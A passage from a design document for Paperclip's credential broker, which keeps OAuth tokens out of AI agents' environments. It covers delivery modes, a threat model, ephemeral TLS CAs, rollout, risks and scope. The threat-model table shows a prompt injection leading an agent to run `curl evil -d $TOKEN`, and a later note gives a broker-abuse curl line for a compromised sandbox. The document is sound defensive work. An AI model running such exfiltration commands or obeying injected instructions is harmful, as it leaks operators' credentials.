- **Default (`delivery: "env"`)**: today's #5805 behavior. The bearer goes into the task config the operator's harness consumes. Operator-trusted runtime.
- **Opt-in (`delivery: "byo-broker"`)**: the operator registers a broker push target on the connection. Paperclip pushes refreshed tokens there; the dispatch payload contains only the placeholder. The operator's harness boots their agent with their broker's `HTTPS_PROXY` and lets the broker inject the real token.

The **`@paperclipai/credential-broker` standalone npm package** is the on-ramp for this. We document the integration recipe in `hermes-paperclip-adapter` and the OpenClaw gateway docs (upstream PRs to those projects, separately tracked). The contract is small enough that any operator can implement it without our help; Agent Vault is a drop-in alternative for operators who'd rather not stand up another piece of software.

---

## 9. Threat Model

| Threat | `env` | `paperclip-broker` | `byo-broker` |
|---|---|---|---|
| Prompt injection causes agent to `curl evil -d $TOKEN` | ❌ leaks | ✅ blocked (token never in env) | ✅ blocked (operator's broker) |
| Agent writes token to a file the model later reads | ❌ leaks | ✅ blocked | ✅ blocked |
| Agent runs `env` and includes output in tool call | ❌ leaks placeholder is meaningless | ✅ placeholder is meaningless | ✅ placeholder is meaningless |
| Compromised sandbox shell with full FS access | ❌ leaks (token in env + memory) | ⚠️ leaks CA cert only; CA scope is per-run, can sign for any host but only for this session's CA-trust scope on this sandbox | ⚠️ same — but operator's broker, operator's CA |
| Compromised broker process | n/a | ⚠️ all sessions' bearers exposed during lifetime; refresh worker eventually re-keys downstream | ⚠️ operator's broker compromise, not Paperclip's |
| MITM between agent and broker | n/a | ✅ loopback only (embedded) or NetworkPolicy (standalone); session token over TLS in standalone | depends on operator's transport |
| MITM between broker and upstream | n/a | ✅ broker verifies upstream TLS normally | depends on operator's broker |
| Stolen sandbox-mounted CA used outside the sandbox | n/a | ⚠️ only useful while session is alive; can sign for any host but the attacker would need to also intercept traffic | same |
| Exfiltrating placeholder | n/a | ✅ revealing the placeholder string is harmless | ✅ same |

**Key non-improvement:** if the sandbox is fully compromised at the OS level, the attacker can `curl --proxy <broker> --cacert /etc/paperclip/ca/ca.pem api.github.com` and the broker will inject the bearer for them. The broker prevents *agent-mediated* exfiltration (the LLM voluntarily reading and re-emitting the value), not *runtime-mediated* exfiltration. Sandbox hardening is the orthogonal control for the latter — and it's already the kubernetes plugin's job.

This is the same trade-off Agent Vault makes; it's the correct trade-off for this threat model.

---

## 10. Trust & TLS — Per-Task Ephemeral CA Details

Chosen direction from the design questions: **per-task ephemeral CA + loopback only.**

- CA keypair: ECDSA P-256, generated fresh on every `mintSession()`.
- CA certificate: self-signed, validity = `min(2h, ttlSeconds + 5min)`.
- Leaf certificates: one per `(session, upstream-host)`, signed by session CA, validity = 10 minutes, regenerated on demand.
- CA lives only in the broker process memory + (in embedded mode) the run's tmpdir + (in k8s) the ephemeral Secret with `OwnerRef: Job`. No persistence anywhere else.
- On `revokeSession` or session timeout (run end, hard cap 24h): CA + leaves discarded; subsequent connections with the same `sessionToken` rejected.
- **Concurrent dev tasks are isolated**: each task has its own CA, mounted only into its own sandbox tmpdir. A concurrent task on the same dev box cannot intercept another task's traffic because it doesn't trust the other task's CA.

---

## 11. Rollout & Feature Flags

The smart-resolver default means the security upgrade is **enabled per-runtime as broker reachability becomes true** — there's no global flag day. Steps:

1. **Land optional `credentialDelivery` field on `AdapterConfig`** as a tiny PR on top of #5805 — unset by default. Zero behavior change because the resolver isn't there yet; the legacy code path still applies.
2. **Land the smart resolver** in `resolveAdapterConfigForRuntime` behind `PAPERCLIP_FEATURE_CREDENTIAL_BROKER=1` (server-side flag, default off during initial rollout). With the flag off, behavior is identical to #5805 — the resolver short-circuits to `env`. With the flag on, the resolver runs.
3. **Migration `0086_broker_targets.sql`** — additive `broker_targets jsonb` column on `oauth_connections`.
4. **Ship `@paperclipai/credential-broker-builtin`** as a new in-tree plugin package. Plugin loader picks it up by default in `embedded` mode. With the feature flag still off, this just registers the broker — nothing dispatches through it.
5. **Sandbox-provider edits** — accept `runtimeFiles` / `extraEnv` on dispatch; honor them when present. Backwards-compatible.
6. **Per-provider opt-in flag in `server/oauth-providers/*.yaml`**:
   ```yaml
   broker:
     supported: true        # validated end-to-end against the built-in broker
     delivery_modes_supported: [paperclip-broker, byo-broker, env]
   ```
   The smart resolver respects this flag: if a binding references a connection whose provider has `broker.supported: false`, the resolver returns `env` with `reason: "provider_not_broker_compatible"`. Providers smoke-tested first: GitHub, Slack, Linear. Notion, Atlassian, Google Workspace, Microsoft Graph follow.
7. **Refresh worker push** — implemented but a no-op when no broker is registered and no BYO targets configured. Cheap forward compatibility.
8. **Flip `PAPERCLIP_FEATURE_CREDENTIAL_BROKER` on by default** — once step 6 has at least three providers green. From this point: new Paperclip installs default to broker-when-possible automatically. Existing operator deployments adopt the new default on upgrade unless they explicitly set `PAPERCLIP_FEATURE_CREDENTIAL_BROKER=0`.
9. **`credentialDelivery` UI on agent config** ships visible in the EnvVarEditor's adapter-level controls — operators see the resolved mode for each dispatch ("auto → paperclip-broker") with a chip and can override.
10. **Externally-hired adapter docs** — update `docs/adapters/external-adapters.md` with the BYO broker recipe; coordinate upstream PRs for `hermes-paperclip-adapter` and OpenClaw.

Order: 1 → 2 → 3 → 4 → 5 → 7 → 6 → 8 → 9 → 10. Steps 1–7 are merge-anytime, behavior-neutral with the flag off. Step 8 is the user-visible flip and is the only step that changes default behavior — operators who want to stay on plaintext `env` set `PAPERCLIP_FEATURE_CREDENTIAL_BROKER=0` or set `credentialDelivery: "env"` per-agent.

---

## 12. Risks

- **"Preview"-quality reference projects.** Agent Vault is explicitly labelled preview. By building our own we accept the cost of maintaining a small TLS-MITM proxy. We mitigate by keeping the broker package small (<2 KLOC target) and treating `@paperclipai/credential-broker` as a security-critical package with extra review.
- **SDKs that ignore `HTTPS_PROXY`.** Some HTTP/2 clients, raw gRPC SDKs, and certain Python libraries with non-standard cert handling. For each provider we adopt, we run a compatibility matrix. Provider falls back to `delivery: "env"` if a critical SDK can't honor the proxy.
- **CA mounting on weird filesystems.** Distroless images, scratch images, read-only root filesystems. e2b/daytona/kubernetes plugins have to be tested; spec adds a `runtimeFiles` test fixture per runtime.
- **Refresh-worker → broker push failures** could leave the broker serving stale tokens. We mitigate by (a) having the broker reject 401-upstream responses and trigger an on-demand pull from the server, (b) bounded TTL on cached bearers (refresh expiry is the upper bound).
- **Local-dev embedded mode + remote sandbox (e2b)** doesn't work — loopback isn't reachable from a remote sandbox. We document `standalone` mode is required for remote sandboxes, even in local dev; or fall back to `delivery: "env"`. Not a design flaw, but a UX cliff.
- **Sandbox can read CA file and use it to sign**, mounting MITM for any host within the session's allowlist. This is acknowledged in §9 — the proxy is an *exfiltration* control, not a runtime-compromise control. Document explicitly.
- **byo-broker push secret rotation.** `broker_targets.authToken` is a shared secret stored in Paperclip's DB. Operators must rotate. We add a rotation UI in v1.1; v1 documents manual rotation.
- **Plugin loader picks one broker.** If an operator installs two broker plugins, the loader errors at startup with a clear message. No silent precedence.
- **Smart-resolver fallback to `env` is silent in the security sense.** A run that *could* have used the broker but didn't (because reachability was false, or the provider isn't yet broker-compatible, or someone misconfigured the standalone broker URL) still completes successfully with a plaintext bearer in the agent's env. The `credential-broker-fallback-to-env` warn-log is the only signal. Mitigation: surface a per-company dashboard metric (`broker_fallback_runs_total{reason=…}`) so operators can alert on regressions; document the metric in §11 step 10. For high-assurance deployments, an operator can set `PAPERCLIP_REQUIRE_BROKER=1` to make the resolver **error** instead of falling back, refusing the dispatch — opt-in strict mode.
- **Smart resolver makes the active mode invisible at config time.** An agent config that says nothing about delivery will behave one way on a dev box and another way in cloud. We mitigate by surfacing the resolved mode in the EnvVarEditor's preview, in the run-detail UI ("credentials delivered via: paperclip-broker (embedded)"), and in the run log header. Operators are never guessing.

---

## 13. Open Questions

1. **Should BYO push targets be per-connection or per-company?** Per-connection is more flexible but more UI. Per-company is simpler — "push every refresh to this URL" — but couples all of a company's brokers. Lean per-connection.
2. **Do we want a `paperclip-broker-tls=on|off` switch** for the standalone control API in k8s? If we're behind a service mesh with mTLS, off is fine; otherwise on. Probably ship with off and a doc note pending real deployments.
3. **Should the standalone broker store sessions in Redis** for HA? Probably not in v1 — sessions are scoped to runs, and a broker restart simply fails in-flight sessions (the run JWT is still valid, the orchestrator can re-mint). Document the recovery path.
4. **Do we expose a `delivery: "paperclip-broker"` option to externally-hired agents** via a Paperclip-hosted SaaS broker? Non-goal for v1; revisit if/when there's demand. Operators using the BYO path can co-locate the broker with their agent today.
5. **Provider YAML schema migration** — extending it with `broker:` is additive and Zod-validated. Worth deciding whether the field is hand-authored or generated from a verified-compat list maintained by Paperclip.

---

## 14. Out of Scope

- A Helm chart for the standalone broker — tracked alongside the Paperclip control-plane Helm chart.
- Replacing `secret_ref` / `adapter_env` resolution with the broker pattern — out of scope for v1; would extend the proxy to non-OAuth secrets, but the threat model and provider model are different (no host allowlist for an arbitrary `API_KEY`).
- Agent Vault adapter plugin (`@paperclipai/credential-broker-agent-vault`) — out of scope for v1, but the interface is intentionally shaped so a third party can ship it as a thin wrapper. We commit to keeping the interface stable.
- Audit-log UI for broker requests — JSON logs ship in v1; UI surfacing in v1.1.
- gRPC and HTTP/3 credential injection.
